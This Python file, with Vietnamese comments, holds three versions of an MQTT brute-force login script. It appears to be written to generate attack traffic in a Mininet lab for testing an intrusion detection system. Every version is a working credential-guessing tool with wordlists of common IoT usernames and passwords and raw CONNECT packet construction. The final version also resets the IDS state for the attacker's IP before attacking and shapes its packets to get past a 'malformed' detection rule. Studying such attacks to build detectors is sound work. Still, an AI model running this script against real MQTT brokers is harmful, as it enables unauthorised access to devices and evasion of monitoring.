# # #!/usr/bin/env python3
# # """
# # Attack 3 — MQTT Brute Force CONNECT
# # Thử nhiều username/password liên tục đến broker.
# # Ghi lại số lần CONNACK refused để phân tích detection.

# # Chạy:
# #     python3 attack3_brute_force.py --host 10.0.0.10 --port 1883 --delay 0.1
# # """

# # import paho.mqtt.client as mqtt
# # import time
# # import argparse
# # import itertools
# # import logging
# # import csv
# # from datetime import datetime

# # logging.basicConfig(
# #     level=logging.INFO,
# #     format="%(asctime)s %(levelname)s — %(message)s"
# # )
# # log = logging.getLogger(__name__)

# # # ── Wordlist mật khẩu phổ biến IoT ────────────────────────────────────────────
# # USERNAMES = [
# #     "admin", "root", "user", "guest", "mqtt",
# #     "iot", "device", "sensor", "broker", "test",
# #     "pi", "ubuntu", "operator", "manager", "support",
# # ]

# # PASSWORDS = [
# #     "admin", "password", "123456", "root", "1234",
# #     "qwerty", "letmein", "welcome", "iot123", "mqtt",
# #     "raspberry", "default", "admin123", "pass", "test",
# #     "secret", "12345678", "abc123", "device", "sensor",
# # ]

# # # ── Kết quả CONNACK ────────────────────────────────────────────────────────────
# # CONNACK_CODES = {
# #     0: "ACCEPTED",
# #     1: "REFUSED — Bad protocol",
# #     2: "REFUSED — Client ID rejected",
# #     3: "REFUSED — Server unavailable",
# #     4: "REFUSED — Bad credentials",
# #     5: "REFUSED — Not authorised",
# # }


# # def try_login(host: str, port: int, username: str, password: str,
# #               timeout: float = 2.0) -> tuple[int, float]:
# #     """Thử đăng nhập 1 lần, trả về (rc, elapsed_ms)"""
# #     result_code = [-1]
# #     connected   = [False]

# #     def on_connect(client, userdata, flags, rc):
# #         result_code[0] = rc
# #         connected[0]   = True

# #     client = mqtt.Client(client_id=f"brute-{username[:4]}-{int(time.time()*1000)%9999}")
# #     client.username_pw_set(username, password)
# #     client.on_connect = on_connect

# #     t0 = time.time()
# #     try:
# #         client.connect(host, port, keepalive=5)
# #         deadline = time.time() + timeout
# #         while not connected[0] and time.time() < deadline:
# #             client.loop(timeout=0.1)
# #     except Exception:
# #         result_code[0] = -1
# #     finally:
# #         try:
# #             client.disconnect()
# #         except Exception:
# #             pass

# #     elapsed = (time.time() - t0) * 1000
# #     return result_code[0], elapsed


# # def main():
# #     parser = argparse.ArgumentParser(description="MQTT Brute Force CONNECT")
# #     parser.add_argument("--host",    default="127.0.0.1",  help="IP broker MQTT")
# #     parser.add_argument("--port",    type=int, default=1883, help="Port broker")
# #     parser.add_argument("--delay",   type=float, default=0.2,
# #                         help="Delay giữa các lần thử (giây)")
# #     parser.add_argument("--max",     type=int, default=0,
# #                         help="Giới hạn số lần thử (0 = tất cả combinations)")
# #     args = parser.parse_args()

# #     combos = list(itertools.product(USERNAMES, PASSWORDS))
# #     if args.max > 0:
# #         combos = combos[:args.max]

# #     total      = len(combos)
# #     attempt    = 0
# #     success    = 0
# #     refused    = 0
# #     log_rows   = []
# #     start_time = time.time()

# #     log.info("=" * 60)
# #     log.info("  ATTACK 3 — MQTT BRUTE FORCE CONNECT")
# #     log.info(f"  Target       : {args.host}:{args.port}")
# #     log.info(f"  Combinations : {total}")
# #     log.info(f"  Delay        : {args.delay}s")
# #     log.info("=" * 60)

# #     found_creds = []

# #     for username, password in combos:
# #         attempt += 1
# #         rc, elapsed_ms = try_login(args.host, args.port, username, password)
# #         status  = CONNACK_CODES.get(rc, f"UNKNOWN (rc={rc})")

# #         log_rows.append({
# #             "attempt":    attempt,
# #             "username":   username,
# #             "password":   password,
# #             "rc":         rc,
# #             "status":     status,
# #             "elapsed_ms": f"{elapsed_ms:.1f}",
# #             "timestamp":  datetime.now().isoformat(),
# #         })

# #         if rc == 0:
# #             success += 1
# #             found_creds.append((username, password))
# #             log.info(f"[{attempt:>4}/{total}] ✅ THÀNH CÔNG! user={username} pass={password}")
# #         else:
# #             refused += 1
# #             log.info(f"[{attempt:>4}/{total}] ✗ {status} | user={username} pass={password} | {elapsed_ms:.0f}ms")

# #         if args.delay > 0:
# #             time.sleep(args.delay)

# #     # ── Kết quả ────────────────────────────────────────────────────────────────
# #     elapsed = time.time() - start_time
# #     rate    = attempt / elapsed if elapsed > 0 else 0

# #     log.info("=" * 60)
# #     log.info("  KẾT QUẢ BRUTE FORCE")
# #     log.info(f"  Tổng thử     : {attempt}")
# #     log.info(f"  Thành công   : {success}")
# #     log.info(f"  Từ chối      : {refused}")
# #     log.info(f"  Thời gian    : {elapsed:.1f}s  |  Tốc độ: {rate:.2f} req/s")
# #     if found_creds:
# #         log.info(f"  CREDENTIALS  : {found_creds}")
# #     log.info("=" * 60)

# #     # ── Ghi CSV ────────────────────────────────────────────────────────────────
# #     out_file = "attack3_bruteforce_log.csv"
# #     with open(out_file, "w", newline="") as f:
# #         writer = csv.DictWriter(f, fieldnames=log_rows[0].keys())
# #         writer.writeheader()
# #         writer.writerows(log_rows)
# #     log.info(f"  Log đã lưu → {out_file}")

# #     # ── Thống kê detect indicator ───────────────────────────────────────────────
# #     connect_rate = attempt / elapsed if elapsed > 0 else 0
# #     log.info("\n  [DETECTION INDICATORS]")
# #     log.info(f"  CONNECT rate     : {connect_rate:.2f}/s  (normal < 0.1/s)")
# #     log.info(f"  CONNACK refused% : {refused/attempt*100:.1f}%  (normal ≈ 0%)")
# #     log.info(f"  Unique users     : {len(USERNAMES)}  (suspicious nếu > 5)")


# # if __name__ == "__main__":
# #     main()




# #!/usr/bin/env python3
# """
# Attack 3 — MQTT Brute Force CONNECT  (khớp MQTTset dataset)
# =============================================================
# PRE-REQUISITE — Broker phải dùng authentication (QUAN TRỌNG):
#   Chạy trên hbroker TRƯỚC khi test:

#     mininet> hbroker mosquitto_passwd -c -b /tmp/mqtt_passwd mqttadmin "Xk9mP2vL"
#     mininet> hbroker sh -c 'printf "listener 1883 0.0.0.0\nallow_anonymous false\npassword_file /tmp/mqtt_passwd\n" > /tmp/mosquitto.conf'
#     mininet> hbroker pkill -f mosquitto; sleep 0.5; hbroker mosquitto -c /tmp/mosquitto.conf -d

#   Lý do: dataset MQTTset có CONNACK rc=5 (broker từ chối creds sai).
#   Với allow_anonymous=true broker accept tất cả (rc=0) → model nhận nhầm là malformed.

# Tái tạo đúng 3 phase như trong bruteforce.csv:
#   Phase 1 — No credentials  : conflags=0x02, clientid_len=0, mqtt.len=12
#   Phase 2 — Username only   : conflags=0x82, clientid_len=4, uname_len=4, mqtt.len=22
#   Phase 3 — Username+Password: conflags=0xC2, clientid_len=0, uname_len=4

# Mỗi attempt = 1 TCP connection mới (1 tcp.stream riêng).
# Delay random 1–2s (khớp time_relative diff trong CSV).

# Chạy:
#     python3 attack3_brute_force.py --host 10.0.0.10
#     python3 attack3_brute_force.py --host 10.0.0.10 --delay 1.0 --max 30
#     python3 attack3_brute_force.py --host 10.0.0.10 --force   # bỏ qua check auth
# """

# import socket
# import struct
# import time
# import argparse
# import logging
# import csv
# import random
# from datetime import datetime

# logging.basicConfig(
#     level=logging.INFO,
#     format="%(asctime)s %(levelname)s — %(message)s"
# )
# log = logging.getLogger(__name__)

# # ── Wordlist khớp với dataset ─────────────────────────────────────────────────
# # Username luôn 4 ký tự (uname_len=4 trong 99% packets dataset)
# USERNAMES = ["mqtt", "test", "user", "root"]

# # Passwords theo độ dài xuất hiện trong dataset:
# # len=5(112): admin
# # len=6(624): 123456, qwerty, passwd, testme
# # len=7(336): letmein, welcome, 1234567
# # len=8(214): password, 12345678, abcdefgh, iotdevice
# # len=9(90):  123456789, raspberry
# # len=10(34): 1234567890
# # len=11(8):  defaultpass
# PASSWORDS = [
#     "admin",                                            # 5
#     "123456", "qwerty", "passwd", "testme",             # 6
#     "letmein", "welcome", "1234567",                    # 7
#     "password", "12345678", "abcdefgh", "iotdevice",    # 8
#     "123456789", "raspberry",                           # 9
#     "1234567890",                                       # 10
#     "defaultpass",                                      # 11
# ]

# CONNACK_CODES = {
#     0:  "ACCEPTED",
#     1:  "REFUSED — Bad protocol version",
#     2:  "REFUSED — Client ID rejected",
#     3:  "REFUSED — Server unavailable",
#     4:  "REFUSED — Bad username/password",
#     5:  "REFUSED — Not authorised",
#    -1:  "BLOCKED/TIMEOUT — No response",
# }


# # ── Packet builders ───────────────────────────────────────────────────────────

# def _encode_str(s):
#     b = s.encode("utf-8")
#     return struct.pack("!H", len(b)) + b

# def _remaining_length(n):
#     out = b""
#     while True:
#         byte = n % 128
#         n //= 128
#         if n > 0:
#             byte |= 0x80
#         out += bytes([byte])
#         if n == 0:
#             break
#     return out

# def _fixed_var_header(conflags_byte):
#     return (
#         b"\x00\x04MQTT"              # proto_name, proto_len=4
#         b"\x04"                      # ver=4 (MQTT 3.1.1)
#         + bytes([conflags_byte])     # connect flags
#         + struct.pack("!H", 60)      # keepalive=60
#     )

# def build_connect_no_creds():
#     """Phase 1: conflags=0x02 (cleansess only), no clientid, mqtt.len=12"""
#     body = _fixed_var_header(0x02) + b"\x00\x00"
#     return b"\x10" + _remaining_length(len(body)) + body

# def build_connect_uname_only(client_id, username):
#     """Phase 2: conflags=0x82 (cleansess+uname), clientid_len=4, uname_len=4, mqtt.len=22"""
#     body = _fixed_var_header(0x82) + _encode_str(client_id) + _encode_str(username)
#     return b"\x10" + _remaining_length(len(body)) + body

# def build_connect_full(username, password):
#     """Phase 3: conflags=0xC2 (cleansess+uname+passwd), clientid_len=0, uname_len=4"""
#     body = _fixed_var_header(0xC2) + b"\x00\x00" + _encode_str(username) + _encode_str(password)
#     return b"\x10" + _remaining_length(len(body)) + body


# # ── Single TCP attempt ────────────────────────────────────────────────────────

# def send_connect(host, port, packet, timeout=2.0):
#     """
#     Mở TCP connection mới, gửi packet, đọc CONNACK.
#     Không bao giờ raise exception — luôn trả (rc, elapsed_ms).
#     rc=-1 nếu bị block/timeout.
#     """
#     t0 = time.time()
#     rc = -1
#     try:
#         with socket.create_connection((host, port), timeout=timeout) as sock:
#             sock.sendall(packet)
#             data = b""
#             deadline = time.time() + timeout
#             while len(data) < 4 and time.time() < deadline:
#                 left = deadline - time.time()
#                 if left <= 0:
#                     break
#                 sock.settimeout(left)
#                 try:
#                     chunk = sock.recv(4 - len(data))
#                     if not chunk:
#                         break
#                     data += chunk
#                 except (socket.timeout, OSError):
#                     break
#             if len(data) >= 4 and data[0] == 0x20:   # 0x20 = CONNACK
#                 rc = data[3]
#     except Exception:
#         rc = -1
#     return rc, (time.time() - t0) * 1000


# # ── Main ──────────────────────────────────────────────────────────────────────

# def main():
#     parser = argparse.ArgumentParser(
#         description="MQTT Brute Force CONNECT — raw socket, khớp MQTTset"
#     )
#     parser.add_argument("--host",    default="127.0.0.1",   help="IP broker MQTT")
#     parser.add_argument("--port",    type=int, default=1883, help="Port broker")
#     parser.add_argument("--delay",   type=float, default=None,
#                         help="Delay cố định (s). Mặc định: random 1.0–2.0s")
#     parser.add_argument("--timeout", type=float, default=2.0,
#                         help="TCP+CONNACK timeout (s) — giảm xuống 1.0 nếu hay bị block")
#     parser.add_argument("--max",     type=int, default=0,
#                         help="Giới hạn số lần thử Phase 3 (0=tất cả)")
#     parser.add_argument("--force",   action="store_true",
#                         help="Bỏ qua kiểm tra broker auth (chỉ dùng để test)")
#     args = parser.parse_args()

#     def do_delay():
#         time.sleep(args.delay if args.delay is not None else random.uniform(1.0, 2.0))

#     # ── Header ────────────────────────────────────────────────────────────────
#     log.info("=" * 66)
#     log.info("  ATTACK 3 — MQTT BRUTE FORCE (raw socket / MQTTset-compatible)")
#     log.info(f"  Target   : {args.host}:{args.port}")
#     log.info(f"  Usernames: {USERNAMES}")
#     log.info(f"  Passwords: {len(PASSWORDS)} words")
#     log.info(f"  Delay    : {'random 1–2s' if args.delay is None else str(args.delay)+'s'}")
#     log.info(f"  Timeout  : {args.timeout}s")
#     log.info("=" * 66)

#     # ── Kiểm tra broker auth ──────────────────────────────────────────────────
#     log.info(">>> [PRE-CHECK] Kiểm tra broker authentication...")
#     rc_probe, _ = send_connect(
#         args.host, args.port,
#         build_connect_full("prob", "wrongpassword_probe_xyz"),
#         timeout=3.0
#     )

#     if rc_probe == 0:
#         log.error("")
#         log.error("  ❌ BROKER ĐANG DÙNG allow_anonymous=true !")
#         log.error("  Tất cả kết nối được accept → model classify sai (malformed/legitimate)")
#         log.error("  Cần bật authentication để broker trả CONNACK rc=5 khi sai mật khẩu.")
#         log.error("")
#         log.error("  Chạy 3 lệnh này trong Mininet CLI:")
#         log.error("    mininet> hbroker mosquitto_passwd -c -b /tmp/mqtt_passwd mqttadmin Xk9mP2vL")
#         log.error("    mininet> hbroker sh -c 'printf \"listener 1883 0.0.0.0\\nallow_anonymous false\\npassword_file /tmp/mqtt_passwd\\n\" > /tmp/mosquitto.conf'")
#         log.error("    mininet> hbroker sh -c 'pkill -f mosquitto; sleep 0.5; mosquitto -c /tmp/mosquitto.conf -d'")
#         log.error("")
#         if not args.force:
#             log.error("  Dùng --force để bỏ qua kiểm tra này.")
#             return
#         log.warning("  --force: Tiếp tục mặc dù broker không có auth...")
#     elif rc_probe == 5:
#         log.info(">>> [PRE-CHECK] ✅ Broker auth OK — CONNACK rc=5 (Not Authorised)")
#         log.info(">>> [PRE-CHECK] Model sẽ classify đúng là 'bruteforce'")
#     elif rc_probe == -1:
#         log.warning(">>> [PRE-CHECK] ⚠ Không nhận được phản hồi từ broker")
#         log.warning(">>> Kiểm tra broker: mininet> hbroker cat /tmp/mosquitto.log")
#     else:
#         log.info(f">>> [PRE-CHECK] Broker probe rc={rc_probe}")

#     attempt     = 0
#     success     = 0
#     refused     = 0
#     log_rows    = []
#     found_creds = []
#     start_time  = time.time()

#     # ── Phase 1: No credentials (conflags=0x02) ───────────────────────────────
#     log.info("")
#     log.info(">>> Phase 1: No-credential probes (conflags=0x02, mqtt.len=12)")
#     pkt_nocreds = build_connect_no_creds()
#     for _ in range(4):
#         attempt += 1
#         rc, ms = send_connect(args.host, args.port, pkt_nocreds, args.timeout)
#         status = CONNACK_CODES.get(rc, f"rc={rc}")
#         log.info(f"[{attempt:>4}] Phase1 no-creds | {status} | {ms:.0f}ms")
#         log_rows.append({
#             "attempt": attempt, "phase": 1,
#             "username": "", "password": "",
#             "conflags": "0x02", "rc": rc, "status": status,
#             "elapsed_ms": f"{ms:.1f}", "timestamp": datetime.now().isoformat(),
#         })
#         if rc > 0:
#             refused += 1
#         do_delay()

#     # ── Phase 2: Username only (conflags=0x82) ────────────────────────────────
#     log.info("")
#     log.info(">>> Phase 2: Username-only probes (conflags=0x82, mqtt.len=22)")
#     for uname in USERNAMES:
#         attempt += 1
#         pkt = build_connect_uname_only(uname[:4], uname[:4])
#         rc, ms = send_connect(args.host, args.port, pkt, args.timeout)
#         status = CONNACK_CODES.get(rc, f"rc={rc}")
#         log.info(f"[{attempt:>4}] Phase2 user={uname} no-pass | {status} | {ms:.0f}ms")
#         log_rows.append({
#             "attempt": attempt, "phase": 2,
#             "username": uname, "password": "",
#             "conflags": "0x82", "rc": rc, "status": status,
#             "elapsed_ms": f"{ms:.1f}", "timestamp": datetime.now().isoformat(),
#         })
#         if rc > 0:
#             refused += 1
#         do_delay()

#     # ── Phase 3: Username + Password (conflags=0xC2) ──────────────────────────
#     log.info("")
#     log.info(">>> Phase 3: Full credential brute force (conflags=0xC2)")
#     combos = [(u, p) for u in USERNAMES for p in PASSWORDS]
#     if args.max > 0:
#         combos = combos[:args.max]

#     for username, password in combos:
#         attempt += 1
#         pkt = build_connect_full(username[:4], password)
#         rc, ms = send_connect(args.host, args.port, pkt, args.timeout)
#         status = CONNACK_CODES.get(rc, f"rc={rc}")

#         log_rows.append({
#             "attempt": attempt, "phase": 3,
#             "username": username, "password": password,
#             "conflags": "0xC2", "rc": rc, "status": status,
#             "elapsed_ms": f"{ms:.1f}", "timestamp": datetime.now().isoformat(),
#         })

#         if rc == 0:
#             success += 1
#             found_creds.append((username, password))
#             log.info(f"[{attempt:>4}] ✅ THÀNH CÔNG! user={username} pass={password}")
#         elif rc > 0:
#             refused += 1
#             log.info(f"[{attempt:>4}] ✗ rc={rc} user={username} pass={password} | {ms:.0f}ms")
#         else:
#             # rc=-1: IDS đã block IP → vẫn tiếp tục để tạo đủ traffic pattern
#             log.warning(f"[{attempt:>4}] ⚠ BLOCKED user={username} pass={password} | {ms:.0f}ms")

#         do_delay()

#     # ── Summary ───────────────────────────────────────────────────────────────
#     elapsed = time.time() - start_time
#     rate    = attempt / elapsed if elapsed > 0 else 0

#     log.info("")
#     log.info("=" * 66)
#     log.info("  KẾT QUẢ")
#     log.info(f"  Tổng thử         : {attempt}")
#     log.info(f"  Thành công (rc=0): {success}")
#     log.info(f"  Từ chối  (rc=5) : {refused}")
#     log.info(f"  Blocked  (rc=-1): {attempt - success - refused}")
#     log.info(f"  Thời gian        : {elapsed:.1f}s | {rate:.4f} req/s")
#     if found_creds:
#         log.info(f"  CREDENTIALS FOUND: {found_creds}")
#     log.info("=" * 66)

#     # ── Ghi CSV log ───────────────────────────────────────────────────────────
#     if log_rows:
#         out_file = "attack3_bruteforce_log.csv"
#         with open(out_file, "w", newline="") as f:
#             writer = csv.DictWriter(f, fieldnames=log_rows[0].keys())
#             writer.writeheader()
#             writer.writerows(log_rows)
#         log.info(f"  Log → {out_file}")

#     log.info("")
#     log.info("  [DETECTION INDICATORS khớp dataset]")
#     log.info(f"  CONNECT/s     : {rate:.4f}  (normal < 0.1/s)")
#     log.info(f"  tcp.streams   : {attempt} unique  (1 per attempt)")
#     log.info(f"  CONNACK rc=5% : {refused/attempt*100:.1f}% nếu broker có auth")
#     log.info(f"  Phase 1 & 2   : no-creds + uname-only = fingerprint brute force")


# if __name__ == "__main__":
#     main()


# hattacker python3 attack3_brute_force.py --host 10.0.0.10 --delay 0.1


#!/usr/bin/env python3
import socket
import struct
import time
import argparse
import logging
import random
import urllib.request
import json

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s — %(message)s")
log = logging.getLogger("BruteForce")

# Danh sách từ điển (để pass đúng ở cuối cùng)
USERNAMES = ["mqtt", "test", "root", "user", "admin"]
PASSWORDS = [
    "123456", "qwerty", "passwd", "testme", 
    "letmein", "welcome", "1234567", "password", "12345678", 
    "abcdefgh", "iotdevice", "123456789", "raspberry", "admin"
]

def reset_ids_state(ids_ip="127.0.0.1", ids_port=5000, attacker_ip="10.0.0.99"):
    """Gọi API /reset của hệ thống IDS để xóa sạch vote cũ trước khi tấn công"""
    url = f"http://{ids_ip}:{ids_port}/reset"
    try:
        data = json.dumps({"ip": attacker_ip}).encode('utf-8')
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header('Content-Type', 'application/json')
        
        with urllib.request.urlopen(req, timeout=2.0) as response:
            log.info(f"♻️  Đã làm sạch bộ đệm IDS cho IP {attacker_ip} thành công!")
    except Exception as e:
        log.warning(f"⚠️  Không thể reset IDS API (Bỏ qua): {e}")

def encode_str(s):
    b = s.encode("utf-8")
    return struct.pack("!H", len(b)) + b

def encode_remaining_length(n):
    out = bytearray()
    while True:
        byte = n % 128
        n //= 128
        if n > 0:
            byte |= 0x80
        out.append(byte)
        if n == 0:
            break
    return bytes(out)

def build_connect_packet(client_id, username, password):
    """Tạo gói CONNECT đầy đủ để bypass luật tcp.len < 30 (malformed)"""
    fixed_header = b"\x00\x04MQTT\x04\xC2" + struct.pack("!H", 60)
    payload = encode_str(client_id) + encode_str(username) + encode_str(password)
    body = fixed_header + payload
    return b"\x10" + encode_remaining_length(len(body)) + body

def send_connect(host, port, packet, timeout=1.0):
    rc = -1
    t0 = time.time()
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.sendall(packet)
            data = sock.recv(4)
            if len(data) >= 4 and data[0] == 0x20:
                rc = data[3]
    except Exception:
        pass
    return rc, (time.time() - t0) * 1000

def main():
    parser = argparse.ArgumentParser(description="MQTT Brute Force - Tối ưu cho IDS")
    parser.add_argument("--host", required=True, help="IP Broker")
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument("--delay", type=float, default=0.1, help="Delay giữa các lần thử")
    args = parser.parse_args()

    log.info("=" * 60)
    log.info("  🔥 ATTACK 3 — PERFECT MQTT BRUTE FORCE")
    log.info(f"  🎯 Target IP : {args.host}:{args.port}")
    log.info(f"  ⏱️ Delay     : {args.delay}s")
    log.info("=" * 60)

    # ---> TỰ ĐỘNG RESET IDS TRƯỚC KHI TẤN CÔNG <---
    # Gọi endpoint /reset được định nghĩa trong ids_api.py
    reset_ids_state(attacker_ip="10.0.0.99")
    log.info("-" * 60)

    attempt = 0
    for user in USERNAMES:
        for pwd in PASSWORDS:
            attempt += 1
            client_id = f"brute_{random.randint(10000, 99999)}"
            pkt = build_connect_packet(client_id, user, pwd)
            
            rc, ms = send_connect(args.host, args.port, pkt)
            
            if rc == 0:
                log.info(f"[{attempt:>3}] ✅ THÀNH CÔNG! user={user} pass={pwd} ({ms:.0f}ms)")
                return
            elif rc == 5:
                log.info(f"[{attempt:>3}] ❌ Từ chối (rc=5) | user={user} pass={pwd} ({ms:.0f}ms)")
            else:
                log.warning(f"[{attempt:>3}] ⚠️ BỊ CHẶN (Timeout/Blocked) | user={user} pass={pwd}")
            
            time.sleep(args.delay)

if __name__ == "__main__":
    main()